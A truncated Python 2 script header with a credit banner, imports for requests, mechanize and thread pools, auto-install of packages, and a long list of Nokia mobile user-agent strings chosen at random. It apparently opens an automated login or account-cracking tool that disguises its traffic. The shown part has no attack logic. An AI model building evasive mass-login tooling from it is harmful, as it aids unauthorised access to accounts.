#!/user/bin/python2
# Coding=utf-8
#======================
#CRIDET RONGBAAZ TM:) #
#======================

import requests,bs4,sys,os,subprocess,getpass,hashlib
import requests,sys,random,time,re,base64,json
from datetime import datetime
from mechanize import Browser
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
if 'linux' in sys.platform.lower():
    N = '\x1b[1;94m'
    G = '\x1b[1;92m'
    O = '\x1b[1;97m'
    R = '\x1b[1;91m'
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
else:
    try:
        import mechanize
    except ImportError:
        os.system('pip2 install mechanize')
    else:
        try:
            import bs4
        except ImportError:
            os.system('pip2 install bs4')

def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.2)

p = "\033[1;37m"
o = "\033[1;36m"

randomua = random.choice(["Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5800d-1/60.0.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4", "Mozilla/5.0 (Series40; NokiaX2-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11", "Mozilla/5.0 (Symbian/3; Series60/5.3 NokiaE7-00/111.040.1511; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1", "Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5230/51.0.002; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4", "Mozilla/5.0 (Symbian/3; Series60/5.3 NokiaC6-01/111.040.1511; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1", "Mozilla/5.0 (Series40; Nokia205.1/04.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia303/14.87; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Symbian/3; Series60/5.3 Nokia500/111.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1", "Mozilla/5.0 (Series40; Nokia110/03.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.2.62.10", "Mozilla/5.0 (Series40; Nokia501/1.0; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.0.0.0.67", "Mozilla/5.0 (Series40; Nokia200/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia205/03.18; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaC5-06/23.6.015; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4", "Mozilla/5.0 (Series40; Nokia200/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia208/03.39; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia205/03.19; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia205.1/04.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia201/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.2.68.14", "Mozilla/5.0 (Series40; Nokia2700c-2/07.80; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia200/10.61; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.7.0.0.11", "Mozilla/5.0 (Series40; Nokia206/04.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia205/04.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia201/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia200/11.95; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.2.0.0.6", "Mozilla/5.0 (Series40; Nokia501/14.0.4/java_runtime_version=Nokia_Asha_1_2; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia205.3/03.19; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia200/11.56; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.1.62.6", "Mozilla/5.0 (Series40; Nokia303/14.87; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia114/03.47; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia311/03.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.2.0.0.31", "Mozilla/5.0 (Series40; Nokia2051/03.20; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia305/07.42; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia201/11.95; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Symbian/3; Series60/5.3 NokiaN8-00/111.040.1511; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1", "Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5233/51.1.002; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4", "Mozilla/5.0 (Series40; Nokia206/04.52; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia206/04.52; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia5130c-2/07.95; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.49", "Mozilla/5.0 (Series40; Nokia305/05.92; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia200/10.61; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.7.0.0.11", "Mozilla/5.0 (Series40; Nokia206/04.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia200/10.60; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia110/03.47; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; NokiaX2-02/11.84; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia2055/03.20; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia112/03.28; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia110/03.33; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; NokiaX2-02/10.91; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia110/03.04; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.7.0.0.11", "Mozilla/5.0 (Series40; Nokia210/04.12; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia200/12.04; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia306/05.93; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia206/03.59; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.2.0.0.6", "Mozilla/5.0 (Series40; Nokia308/05.85; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia202/20.36; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.1.62.6", "Mozilla/5.0 (Series40; Nokia210.2/06.09; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; NokiaX2-01/08.70; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; NokiaC2-02/07.48; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia305/05.92; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia311/07.36; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; NokiaX2-00/04.80; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia200/11.95; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia305/05.92; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.49", "Mozilla/5.0 (Series40; Nokia205/03.18; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.1.0.1", "Mozilla/5.0 (Series40; Nokia302/14.53; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia110/03.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia305/07.42; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.54", "Mozilla/5.0 (Series40; Nokia302/14.78; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; NokiaX2-02/11.63; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia112/03.32; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; NokiaC2-00/03.82; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.1.0.1","Mozilla/5.0 (Series40; Nokia2055/03.20; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaC5-03/21.0.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.30 Mobile Safari/533.4 3gpp-gba", "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.0.1.54", "Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaX6-00/40.0.002; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4", "Mozilla/5.0 (Series40; NokiaX2-01/08.63; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.49", "Mozilla/5.0 (Series40; NokiaX2-02/11.79; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia110/03.04; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia206/03.58; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia200/10.60; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.49", "Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaC5-05/23.5.015; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4", "Mozilla/5.0 (Series40; Nokia311/05.92; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia302/14.78; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.2.68.14", "Mozilla/5.0 (Series40; Nokia200/11.95; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia302/15.15; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.1.0.1", "Mozilla/5.0 (Series40; Nokia200/12.04; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.2.0.0.6", "Mozilla/5.0 (Series40; Nokia205/03.19; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; NokiaC2-03/07.48; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia202/20.36; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia200/11.56; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.1.0.0.62", "Mozilla/5.0 (Series40; Nokia205/03.18; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.1.0.0.62", "Mozilla/5.0 (Series40; Nokia311/05.92; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia311/03.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia202/20.28; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.2.0.0.6", "Mozilla/5.0 (Series40; Nokia200/10.60; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia112/03.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia200/11.95; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.1.0.1", "Mozilla/5.0 (Series40; Nokia206/04.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia202/20.28; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; NokiaC2-03/07.63; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia206/04.52; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.55", "Mozilla/5.0 (Series40; NokiaC2-02/07.66; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia200/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.49", "Mozilla/5.0 (Series40; Nokia206/04.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia200/10.58; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11", "Mozilla/5.0 (Series40; Nokia114/03.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia200/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia202/20.52; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia206/04.52; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.7.0.0.11", "Mozilla/5.0 (Series40; Nokia305/05.92; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia112/03.26; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia114/03.47; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia305/07.42; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; NokiaX3-02.5/06.75; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia305/03.60; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia200/10.58; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia206/04.52; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia200/11.56; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia311/07.36; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia200/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; NokiaC2-06/07.63; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia309/05.85; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia305/05.92; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.2.0.0.6", "Mozilla/5.0 (Series40; Nokia202/20.36; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; NokiaX2-02/11.84; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; NokiaC2-06/07.57; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; NokiaC2-06/07.48; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia200/11.56; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia206/03.58; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.1.0.1", "Mozilla/5.0 (Series40; Nokia210/04.12; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia206/03.59; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.2.0.0.36", "Mozilla/5.0 (Series40; NokiaC2-02/06.96; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia200/11.64; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia308/05.85; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.7.0.0.11", "Mozilla/5.0 (Series40; Nokia311/05.92; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.1.0.1", "Mozilla/5.0 (Series40; Nokia302/14.92; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.1.0.1", "Mozilla/5.0 (Series40; Nokia306/03.63; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia111/03.32; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; NokiaC2-06/07.63; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia301/09.04; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia200/11.95; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.3.0.0.49", "Mozilla/5.0 (Series40; NokiaC2-03/06.96; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia200/11.95; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.2.0.0.36", "Mozilla/5.0 (Series40; Nokia200/10.60; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia206/03.60; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia205.1/03.18; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia111/03.32; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; NokiaC2-03/07.29; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia114/03.47; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; NokiaAsha230DualSIM/14.0.4/java_runtime_version=Nokia_Asha_1_2; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.30", "Mozilla/5.0 (Series40; Nokia208.4/04.06; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia200/12.04; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia203/20.52; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia114/03.33; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia308/08.13; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; NokiaX3-02/le6.32; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.2.62.10", "Mozilla/5.0 (Series40; Nokia210/06.09; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia206/03.59; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia208/03.39; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia206/04.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia200/11.95; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia311/05.92; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; NokiaC2-06/07.63; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia302/14.78; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; NokiaC2-03/07.65; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia200/11.56; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; NokiaC2-03/07.48a; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; Nokia205/04.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; NokiaC2-00/03.99; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia202/20.28; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27", "Mozilla/5.0 (Series40; Nokia309/08.22; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31", "Mozilla/5.0 (Series40; 